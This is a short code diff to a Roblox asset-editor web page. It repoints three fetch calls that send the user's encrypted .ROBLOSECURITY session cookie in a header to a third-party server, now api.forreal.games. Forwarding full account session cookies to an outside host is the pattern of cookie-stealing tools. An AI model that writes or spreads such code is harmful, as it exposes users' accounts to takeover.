@@ -408,7 +408,7 @@ async function hybridEncrypt(plaintext) {
 async function validateTokenInput(token) {
   try {
     const encrypted = await hybridEncrypt(token);
-const res = await fetch("https://roblox-cloud-services.onrender.com/assets", {
+const res = await fetch("https://api.forreal.games/editor/assets", {
   headers: {
     "X-ROBLOSECURITY": JSON.stringify(encrypted)
   }
@@ -482,7 +482,7 @@ toggleAssetSelect();
                 if (!assetId) return;
 
                 (async () => {
-                    fetch(`https://roblox-cloud-services.onrender.com/download/${assetId}`, {
+                    fetch(`https://api.forreal.games/editor/download/${assetId}`, {
                     headers: {
                         "X-ROBLOSECURITY": JSON.stringify(await hybridEncrypt(cookieInput.value))
                     }
@@ -634,7 +634,7 @@ toggleAssetSelect();
                     form.append("assetId", document.getElementById("assetSelect").value);
 
                     (async () => {
-                        fetch("https://roblox-cloud-services.onrender.com/upload", {
+                        fetch("https://api.forreal.games/editor/upload", {
                         method: "POST",
                         headers: {
                             "X-ROBLOSECURITY": JSON.stringify(await hybridEncrypt(cookieInput.value))
